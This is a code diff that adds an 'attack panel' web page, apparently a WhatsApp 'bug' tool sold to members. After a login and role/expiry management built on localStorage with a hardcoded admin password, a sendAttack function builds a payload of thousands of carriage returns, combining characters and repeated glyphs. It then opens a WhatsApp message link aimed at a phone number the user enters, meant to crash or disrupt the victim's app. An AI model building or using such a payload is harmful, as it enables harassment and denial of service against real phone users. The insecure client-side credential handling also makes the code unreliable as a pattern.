@@ -40,3 +40,144 @@
 
         <div id="page-home">
             <div class="card">
+                <h3>DASHBOARD</h3>
+                <p>Welcome, <b id="display-name"></b></p>
+                <p>Role: <span id="display-role"></span></p>
+                <p>Expires: <span id="display-exp" style="color: yellow;"></span></p>
+            </div>
+            <div class="card" style="padding: 0; overflow: hidden;"><img src="https://i.ibb.co/6YfM0Xm/anime-dark.jpg" style="width: 100%;"></div>
+        </div>
+
+        <div id="page-manage" class="hidden">
+            <div class="card">
+                <h3 id="manage-title">USER MANAGEMENT</h3>
+                <label>Username:</label>
+                <input type="text" id="new-user">
+                <label>Password:</label>
+                <input type="password" id="new-pass">
+                <label>Role:</label>
+                <select id="new-role"></select>
+                <label>Expired (Days):</label>
+                <input type="number" id="new-exp" value="30">
+                <button class="btn-main" onclick="createAccount()">CREATE / UPDATE</button>
+            </div>
+            <div class="card">
+                <h4>ACTIVE USERS</h4>
+                <div id="user-list" style="font-size: 0.8rem;"></div>
+            </div>
+        </div>
+
+        <div id="page-attack" class="hidden">
+            <div class="card">
+                <h3>ATTACK PANEL</h3>
+                <input type="number" id="target-num" placeholder="Target: 628xxxx">
+                <button class="btn-main" onclick="sendAttack()">EXECUTE ATTACK!</button>
+            </div>
+        </div>
+
+        <nav class="nav-bottom">
+            <div class="nav-item active" onclick="showPage('home')">HOME</div>
+            <div class="nav-item" onclick="showPage('attack')">ATTACK</div>
+            <div class="nav-item hidden" id="nav-manage" onclick="showPage('manage')">MANAGE</div>
+        </nav>
+    </div>
+
+    <script>
+        // DATABASE SIMULASI
+        if(!localStorage.getItem('nexus_db')) {
+            const initial = [{user: 'hanzX', pass: 'admin', role: 'ADMIN', exp: 'PERMANENT'}];
+            localStorage.setItem('nexus_db', JSON.stringify(initial));
+        }
+
+        let currentUser = null;
+
+        function handleLogin() {
+            const u = document.getElementById('login-user').value;
+            const p = document.getElementById('login-pass').value;
+            const db = JSON.parse(localStorage.getItem('nexus_db'));
+            const found = db.find(x => x.user === u && x.pass === p);
+            
+            if(found) {
+                currentUser = found;
+                document.getElementById('login-screen').classList.add('hidden');
+                document.getElementById('app-content').classList.remove('hidden');
+                setupUI();
+            } else {
+                document.getElementById('login-msg').innerText = "Access Denied cok!";
+            }
+        }
+
+        function setupUI() {
+            document.getElementById('display-name').innerText = currentUser.user;
+            document.getElementById('display-role').innerHTML = `<span class="badge ${currentUser.role}">${currentUser.role}</span>`;
+            document.getElementById('display-exp').innerText = currentUser.exp;
+
+            const nav = document.getElementById('nav-manage');
+            const select = document.getElementById('new-role');
+            
+            if(currentUser.role === 'ADMIN' || currentUser.role === 'OWNER') {
+                nav.classList.remove('hidden');
+                if(currentUser.role === 'ADMIN') {
+                    select.innerHTML = '<option value="OWNER">OWNER</option><option value="MEMBER">MEMBER</option>';
+                } else {
+                    select.innerHTML = '<option value="MEMBER">MEMBER ONLY</option>';
+                }
+                renderUsers();
+            }
+        }
+
+        function createAccount() {
+            const u = document.getElementById('new-user').value;
+            const p = document.getElementById('new-pass').value;
+            const r = document.getElementById('new-role').value;
+            const ex = document.getElementById('new-exp').value;
+            if(!u || !p) return alert("Isi semua mpray!");
+
+            let db = JSON.parse(localStorage.getItem('nexus_db'));
+            const idx = db.findIndex(x => x.user === u);
+            
+            const expDate = new Date();
+            expDate.setDate(expDate.getDate() + parseInt(ex));
+            const expStr = expDate.toISOString().split('T')[0];
+
+            if(idx > -1) {
+                db[idx] = {user: u, pass: p, role: r, exp: expStr}; // Edit
+            } else {
+                db.push({user: u, pass: p, role: r, exp: expStr}); // Create
+            }
+            
+            localStorage.setItem('nexus_db', JSON.stringify(db));
+            alert("Success mpray!");
+            renderUsers();
+        }
+
+        function renderUsers() {
+            const db = JSON.parse(localStorage.getItem('nexus_db'));
+            let html = "";
+            db.forEach(x => {
+                html += `<div style="border-bottom:1px solid #333; padding:10px 0; display:flex; justify-content:space-between;">
+                            <span>${x.user} <span class="badge ${x.role}">${x.role}</span></span>
+                            <span style="color:gray; font-size:0.6rem;">Exp: ${x.exp}</span>
+                         </div>`;
+            });
+            document.getElementById('user-list').innerHTML = html;
+        }
+
+        function showPage(p) {
+            document.getElementById('page-home').classList.add('hidden');
+            document.getElementById('page-manage').classList.add('hidden');
+            document.getElementById('page-attack').classList.add('hidden');
+            document.getElementById('page-' + p).classList.remove('hidden');
+            document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
+            event.currentTarget.classList.add('active');
+        }
+
+        function sendAttack() {
+            const target = document.getElementById('target-num').value;
+            if(!target) return alert("Target mana?");
+            const bug = encodeURIComponent("%0D".repeat(9000) + "҈҉" + " ௌ ".repeat(400) + " [ NEXUS_V1.1 ]");
+            window.location.href = `https://api.whatsapp.com/send?phone=${target}&text=${bug}`;
+        }
+    </script>
+</body>
+</html>
